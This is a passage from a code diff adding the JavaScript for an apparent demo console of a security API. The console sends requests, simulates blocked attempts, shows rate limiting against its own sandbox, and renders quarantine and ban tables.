+        const path = el.path.value.trim() || "/v1";
+        let headers;
+        try { headers = parseHeaders(el.headers.value); new Headers(headers); } catch (e) {
+          last = null;
+          $("#res-status").innerHTML = '<span class="pill s5">client error</span>';
+          $("#res-out").textContent = e.message;
+          return;
+        }
+        const body = el.body.value.trim();
+        const hasBody = body && method !== "GET" && method !== "HEAD" && method !== "OPTIONS";
+        if (hasBody && !Object.keys(headers).some((k) => k.toLowerCase() === "content-type")) headers["Content-Type"] = "application/json";
+        el.send.disabled = true;
+        const t0 = performance.now();
+        try {
+          const res = await api.fetch(path, { method, headers, body: hasBody ? body : undefined });
+          const text = await res.text();
+          const ms = Math.round(performance.now() - t0);
+          absorb(res, text, path);
+          last = {
+            status: res.status, statusText: res.statusText, ms, size: new TextEncoder().encode(text).length, text,
+            headers: [...res.headers.entries()].sort((a, b) => a[0].localeCompare(b[0])),
+            snippet: snippetFor(method, path, headers, hasBody ? body : "")
+          };
+          track(res.status, method, path);
+          renderResponse();
+        } catch (e) {
+          $("#res-status").innerHTML = '<span class="pill s5">client error</span>';
+          $("#res-out").textContent = String(e);
+        } finally {
+          el.send.disabled = false;
+          refresh();
+        }
+      }
+
+      async function simulate(key) {
+        const sim = SIMS[key];
+        const steps = sim.steps();
+        el.send.disabled = true;
+        const t0 = performance.now();
+        const timeline = [];
+        let lastRes = null, lastData = null, blocked = 0;
+        for (let i = 0; i < steps.length; i++) {
+          const res = await api.fetch("/v1/guard/attempts", { method: "POST", headers: { Authorization: "Bearer " + XenoAPI.demoToken, "Content-Type": "application/json" }, body: JSON.stringify(steps[i]) });
+          const data = await res.json();
+          lastRes = res; lastData = data;
+          if (res.status === 403) blocked += 1;
+          if (data.ban && data.ban.id) ctx.banId = data.ban.id;
+          timeline.push(String(i + 1).padStart(2, "0") + "  " + steps[i].ip.padEnd(15) + " " + res.status + "  " + data.decision.padEnd(8) + " " + data.reason + (data.reason !== "banned" && data.ban ? "  → banned " + data.ban.kind + " " + data.ban.value + " until " + (data.ban.expires_at || "never").slice(11, 19) : ""));
+          await new Promise((r) => setTimeout(r, 60));
+        }
+        const text = JSON.stringify({ simulation: sim.title, sent: steps.length, blocked, timeline, verdict: lastData && lastData.decision, last_request: steps[steps.length - 1] }, null, 2);
+        last = {
+          status: lastRes.status, statusText: lastRes.statusText, ms: Math.round(performance.now() - t0), size: text.length, text,
+          headers: [...lastRes.headers.entries()].sort((a, b) => a[0].localeCompare(b[0])),
+          snippet: "// every step is a normal API call:\nfor (const attempt of attempts) {\n  const res = await xeno.fetch('/v1/guard/attempts', {\n    method: 'POST',\n    headers: { Authorization: 'Bearer " + XenoAPI.demoToken + "', 'Content-Type': 'application/json' },\n    body: JSON.stringify(attempt)\n  });\n  console.log(res.status, (await res.json()).decision);\n}",
+          note: "simulation · " + steps.length + " requests"
+        };
+        track(lastRes.status, "SIM", sim.title);
+        renderResponse();
+        $("#rate-meta").textContent = "API tokens " + lastRes.headers.get("ratelimit-remaining") + "/" + lastRes.headers.get("ratelimit-limit");
+        el.send.disabled = false;
+        refresh();
+      }
+
+      async function flood() {
+        const n = 80;
+        el.send.disabled = true;
+        const t0 = performance.now();
+        const results = await Promise.all(Array.from({ length: n }, () => api.fetch("/v1/stats")));
+        const ok = results.filter((r) => r.status === 200).length;
+        const limited = results.find((r) => r.status === 429);
+        const ms = Math.round(performance.now() - t0);
+        if (limited) {
+          const text = await limited.text();
+          last = { status: 429, statusText: limited.statusText, ms, size: text.length, text, headers: [...limited.headers.entries()].sort((a, b) => a[0].localeCompare(b[0])), note: ok + " of " + n + " passed · refills 10/s", snippet: "// 80 requests in one tick:\nconst rs = await Promise.all(Array.from({ length: 80 }, () => xeno.fetch('/v1/stats')));\nconsole.log(rs.map((r) => r.status));" };
+          $("#rate-meta").textContent = "API tokens " + limited.headers.get("ratelimit-remaining") + "/" + limited.headers.get("ratelimit-limit");
+        }
+        track(429, "FLOOD", n + " × GET /v1/stats → " + ok + " ok, " + (n - ok) + " throttled");
+        renderResponse();
+        el.send.disabled = false;
+      }
+
+      /* ── live tables ── */
+      const clip = (s, n) => { const t = String(s).replace(/\s+/g, " "); return t.length > n ? t.slice(0, n - 1) + "…" : t; };
+      const left = (iso) => {
+        const s = Math.max(0, Math.round((Date.parse(iso) - Date.now()) / 1000));
+        if (s >= 3600) return Math.floor(s / 3600) + "h " + Math.floor((s % 3600) / 60) + "m left";
+        if (s >= 60) return Math.floor(s / 60) + "m " + (s % 60) + "s left";
+        return s + "s left";
+      };
+
+      function refresh() {
+        const showDeleted = $("#show-deleted").checked;
+        const cases = api.peekCases();
+        const bans = api.peekBans();
+
+        if (!cases.some((r) => r.id === ctx.caseId)) { const f = cases.find((r) => !r.deleted_at) || cases[0]; ctx.caseId = f ? f.id : ""; }
+        if (!bans.some((r) => r.id === ctx.banId)) { const f = bans.find((r) => r.active) || bans[0]; ctx.banId = f ? f.id : ""; }
+        const cc = cases.find((r) => r.id === ctx.caseId); if (cc) ctx.caseEtag = cc.etag;
+        const bb = bans.find((r) => r.id === ctx.banId); if (bb) ctx.banEtag = bb.etag;
+
+        const flash = (r) => (booted && seen.get(r.id) !== r.version ? "flash" : "");
+
+        $("#quarantine-body").innerHTML = cases.filter((r) => showDeleted || !r.deleted_at).map((r) =>
+          '<tr tabindex="0" data-kind="case" data-id="' + esc(r.id) + '" class="' + (r.id === ctx.caseId ? "is-selected " : "") + (r.deleted_at ? "is-deleted " : "") + flash(r) + '">' +
+          '<td class="wide"><span class="name payload">' + esc(clip(r.payload, 56)) + '</span><span class="sub">' + esc(r.source) + (r.field ? " · " + esc(r.field) : "") + " · " + esc(r.id) + " · v" + r.version + "</span></td>" +
+          '<td><span class="badge ' + r.severity + '">' + r.severity + '</span><span class="sub">' + esc(r.category) + " · " + r.score + "</span></td>" +
+          '<td><span class="badge ' + r.status + '">' + r.status + "</span></td><td>" + r.hits + "</td></tr>"
+        ).join("") || '<tr><td colspan="4" class="empty">Nothing in quarantine. Screen some data above.</td></tr>';
+
+        const activeCount = bans.filter((r) => r.active).length;
+        $("#ban-meta").textContent = activeCount + " active";
+        $("#bans-body").innerHTML = bans.filter((r) => showDeleted || !r.deleted_at).map((r) => {
+          const state = r.deleted_at ? "lifted" : r.active ? (r.expires_at ? "active" : "permanent") : "expired";
+          const sub = r.active && r.expires_at ? left(r.expires_at) : r.kind + " · " + r.scope;
+          return '<tr tabindex="0" data-kind="ban" data-id="' + esc(r.id) + '" class="' + (r.id === ctx.banId ? "is-selected " : "") + (r.deleted_at ? "is-deleted " : "") + flash(r) + '">' +
+            '<td><span class="name">' + esc(r.value) + '</span><span class="sub">' + esc(r.kind) + " · " + esc(r.scope) + " · " + esc(clip(r.reason, 30)) + '</span></td>' +
+            '<td><span class="badge ' + state + '">' + state + '</span><span class="sub">' + esc(sub) + "</span></td><td>" + r.hits + "</td></tr>";
+        }).join("") || '<tr><td colspan="3" class="empty">No bans.</td></tr>';
+
+        cases.forEach((r) => seen.set(r.id, r.version));
+        bans.forEach((r) => seen.set(r.id, r.version));
+        booted = true;
+        renderVars();
+      }
+
+      function openRow(e) {
+        const tr = e.target.closest("tr[data-id]");
+        if (!tr) return;
+        if (tr.dataset.kind === "ban") { ctx.banId = tr.dataset.id; load({ method: "GET", path: "/v1/bans/{{ban}}" }); }
+        else { ctx.caseId = tr.dataset.id; load({ method: "GET", path: "/v1/quarantine/{{case}}" }); }
+        refresh();
+        send();
+      }
+      $("#quarantine-body").addEventListener("click", openRow);
+      $("#bans-body").addEventListener("click", openRow);
+      [$("#quarantine-body"), $("#bans-body")].forEach((b) => b.addEventListener("keydown", (e) => { if (e.key === "Enter") e.target.closest("tr[data-id]")?.click(); }));
+      $("#show-deleted").addEventListener("change", refresh);
+      $("#reset-sandbox").addEventListener("click", () => {
+        load({ method: "POST", path: "/v1/sandbox/reset", headers: [AUTH] });
+        send();
+      });
+
+      document.querySelectorAll(".tab").forEach((t) => t.addEventListener("click", () => { tab = t.dataset.tab; renderResponse(); }));
+      el.send.addEventListener("click", send);
+      [el.path, el.headers, el.body].forEach((f) => f.addEventListener("keydown", (e) => { if ((e.ctrlKey || e.metaKey) && e.key === "Enter") { e.preventDefault(); send(); } }));
+      setInterval(refresh, 5000); // keeps ban countdowns honest
+
+      /* ── boot ── */
+      renderRecipes();
+      refresh();
+      load(RECIPES[1].items[0]);
+      send();
+      api.fetch("/v1/stats").then((r) => r.json()).then((s) => {
+        statusEl.textContent = s.cases.total + " cases in quarantine, " + s.bans.active + " active bans · API v" + XenoAPI.version + " ·";
+      }).catch(() => { statusEl.textContent = "The shield is unreachable."; });
+    })();
   </script>
 </body>
 </html>
